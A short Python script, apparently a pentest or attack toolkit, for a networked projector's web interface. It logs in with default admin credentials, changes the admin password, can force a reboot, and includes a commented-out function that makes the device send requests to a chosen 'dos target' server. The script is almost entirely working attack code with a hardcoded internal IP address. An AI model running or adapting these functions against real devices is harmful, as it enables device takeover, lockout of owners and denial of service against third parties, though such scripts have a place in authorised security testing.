#!/usr/bin/python3

#---------------------------------
# Purpose: Individual Functions

# Version: 1
#
# October 28, 2019
#----------------------------------

import requests
import urllib3

urllib3.disable_warnings()


#host is projector, username generally admin, password generally admin
def AdminLogin(host,username,password):
    print("Trying to login.")


    url = "https://" + host + "/userlogin.html"

    #POST Data
    data = {
        'login': username,
        'passwd': password
    }

    # Send Login Request
    login = requests.post(url=url, data=data, verify=False)

    cookies = login.cookies

    print(cookies)

    ###need to parse cookies


    return cookies

# host is the target, cookie is cookie from AdminLogin, loop is True or False
def Reboot(host, cookies):
    url = "https://" + host + "/Device/DeviceOperations"
    data = {
        "Reboot": "true"
    }
    reboot = requests.post(url=url, data=data, verify=False, cookies=cookies)
    print("Reboot Incoming")

# host is the target, cookie is cookie from AdminLogin, WebServer is dos target
"""def WebDos(host, cookie, WebServer):
    WebServer = "YourTargetHere"
    url = "https://" + host + "/cgi-bin/return.cgi"
    data = {
        "command": "<Send><seid>" + cookie + "</seid><upload><protocol>http</protocol><address>" + WebServer + "</address><logo>TheWeb.png</logo></upload></Send>"
    }
    remoteViewOn = requests.post(url=url, data=data, verify=False)
    print("Web Request Sent")"""

# host is the target, cookie is cookie from AdminLogin,newPass is the pass you want to change it to
def ChangePass(host, cookies, newPass):
    url = "https://" + host + "/Device/Authentication/"

    data = {
        "Name": "admin",
        "Password": newPass
    }
    changePass = requests.post(url=url, data=data, verify=False, cookies=cookies)
    print(changePass.status_code)
    print(changePass.text)
    print("Password Change Request Sent")


def main():
    host = "10.103.36.85"
    username = "admin"
    password = "password"
    newPass = "password1"


    ChangePass(host,AdminLogin(host,username,password),newPass)



if __name__== "__main__":
    main()
